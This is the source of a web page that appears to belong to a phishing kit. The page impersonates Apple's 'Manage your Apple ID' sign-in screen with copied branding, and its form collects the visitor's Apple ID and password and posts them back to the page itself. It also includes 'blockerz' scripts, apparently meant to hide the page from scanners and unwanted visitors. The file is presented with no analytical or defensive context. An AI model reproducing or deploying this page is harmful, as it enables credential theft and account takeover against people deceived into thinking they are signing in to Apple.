<?php
include '../../blockerz.php';
include '../../blockerz2.php';
?>
<!DOCTYPE html>
<html>
<head>
	<title>Manage your Apple ID</title>
		<link rel="stylesheet" type="text/css" href="files/css/style-login-desktop.css">
		<script type="text/javascript" src="files/js/script-login-desktop.js"></script>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="icon" href="files/img/favicon.ico" type="image/x-icon" />

  <script type="text/javascript" src="//code.jquery.com/jquery-1.9.1.js"></script>

<script type='text/javascript'>
//<![CDATA[
$(window).load(function(){
$(".option").click(function(){
    $(this).toggleClass('option2')
});
});//]]> 

</script>
</head>
<body>
<div id="bottom"></div>
<div id="head">
	<img src="files/img/login-desktop.png" style="width:100%;height:100%;">
</div>
<div id="sub_navbar"></div>
<div id="container">
	<div id="xheader">
		<div id="navbar"></div>
	</div>

	<div id="xcontent">
		<form action="" method="POST" target="_self" name="xlogin">
			<font id="Apple_ID">Apple ID</font>
			<font id="Manage_Account">Manage your Apple account</font>
                        <div>
			<input name="xuser" id="xuser" type="email" value="" placeholder="Apple ID" onfocus="return OxForm()">
                        <div id="field-separator" ></div>
			<input name="xpass" id="xpass" type="password" value="" placeholder="Password" onkeyup="return login_BTN()">
			<div id="xbootn"><input name="xbtn" id="xbtn" class="xbtn1" type="submit" value="" onclick="return xForm()" ></div></div>
			<div id="loading"></div>
			<font id="Remember_me">Remember me</font>
			<div class="option"></div>
			<font id="Forgot_Apple_ID">Forgot Apple ID or password?</font>
		</form>
	</div>
	<div id="xfooter"></div>
</div>
</body>
</html>